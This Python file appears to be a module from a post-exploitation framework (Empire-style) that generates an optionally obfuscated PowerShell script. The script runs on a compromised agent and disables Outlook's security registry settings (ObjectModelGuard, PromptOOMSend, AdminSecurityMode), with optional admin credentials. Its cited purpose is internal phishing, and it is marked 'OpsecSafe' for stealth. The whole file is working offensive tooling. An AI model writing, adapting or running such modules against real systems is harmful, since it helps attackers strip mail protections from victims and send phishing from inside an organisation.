from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Disable-SecuritySettings',

            'Author': ['@xorrior'],

            'Description': ("This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. This function must be "
                            "run in an administrative context in order to set the values for the registry keys."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/xorrior/EmailRaider',
                'http://www.xorrior.com/phishing-on-the-inside/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AdminUser' : {
                'Description'   :   'Optional AdminUser credentials to use for registry changes.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AdminPassword' : {
                'Description'   :   'Optional AdminPassword credentials to use for registry changes.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Version' : {
                'Description'   :   'The version of Microsoft Outlook.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Reset' : {
                'Description'   :   'Switch. Reset security settings to default values.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleName = self.info["Name"]
        reset = self.options['Reset']['Value']

        # read in the common powerview.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/MailRaider.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode + "\n" 
        scriptEnd = ""
        if reset.lower() == "true":
            # if the flag is set to restore the security settings
            scriptEnd += "Reset-SecuritySettings "
        else:
            scriptEnd += "Disable-SecuritySettings "

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "reset":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        scriptEnd += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
